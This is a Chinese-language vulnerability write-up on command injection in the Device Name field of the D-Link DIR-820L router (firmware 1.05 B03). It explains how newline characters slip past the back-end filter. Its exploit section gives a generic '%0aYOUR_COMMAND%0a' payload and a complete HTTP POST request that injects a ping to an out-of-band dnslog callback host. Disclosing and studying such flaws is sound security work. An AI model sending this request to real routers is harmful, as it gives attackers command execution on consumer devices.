# D-Link DIR-820L 存在命令注入漏洞

**漏洞厂商**: D-Link

**厂商官网**: http://www.dlink.com.cn/

**影响产品**: DIR-820L

**影响产品版本**: 1.05 B03

**固件链接**: http://www.dlinktw.com.tw/techsupport/download.ashx?file=2663

**发现者**: [SkYe231](mailto:skye231@foxmail.com)@Hillstone, Akast@Hillstone,GD@Hillstone

## 漏洞详情

在路由： `/lan.asp`， `Device Name` 的值可以命令注入。这个参数有前后端过滤，前端过滤可以 burp 抓包绕过，后端过滤在 `hasInjectionString` (在文件 `lib/libleopard.so`) 。阅读源码之后发现 `\n` 没有被过滤。

![image-20220222165316794](img/image-20220222165316794.png)

## EXP

改数据包 `lanHostCfg_DeviceName_1.1.1.0` 的值为要注入的命令即可，例如：

> lanHostCfg_DeviceName_1.1.1.0=%0aYOUR_COMMAND%0a



```html
POST /get_set.ccp HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 768
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/lan.asp
Cookie: hasLogin=1

ccp_act=set&old_ip=192.168.0.1&old_mask=255.255.255.0&new_ip=192.168.0.1&new_mask=255.255.255.0&nextPage=lan.asp&lanHostCfg_IPAddress_1.1.1.0=192.168.0.1&lanHostCfg_SubnetMask_1.1.1.0=255.255.255.0&lanHostCfg_DomainName_1.1.1.0=&lanHostCfg_DNSRelay_1.1.1.0=1&lanHostCfg_DHCPServerEnable_1.1.1.0=1&lanHostCfg_MinAddress_1.1.1.0=192.168.0.100&lanHostCfg_MaxAddress_1.1.1.0=192.168.0.200&lanHostCfg_DHCPLeaseTime_1.1.1.0=1440&lanHostCfg_DeviceName_1.1.1.0=%0aping ccak2r.dnslog.cn%0a&lanHostCfg_AlwaysBroadcast_1.1.1.0=0&lanHostCfg_NetBIOSAnnouncement_1.1.1.0=0&lanHostCfg_NetBIOSLearn_1.1.1.0=0&lanHostCfg_NetBIOSScope_1.1.1.0=&lanHostCfg_NetBIOSNodeType_1.1.1.0=2&lanHostCfg_PrimaryWINSAddress_1.1.1.0=0.0.0.0&lanHostCfg_SecondaryWINSAddress_1.1.1.0=0.0.0.0&1645537536373=1645537536373
```

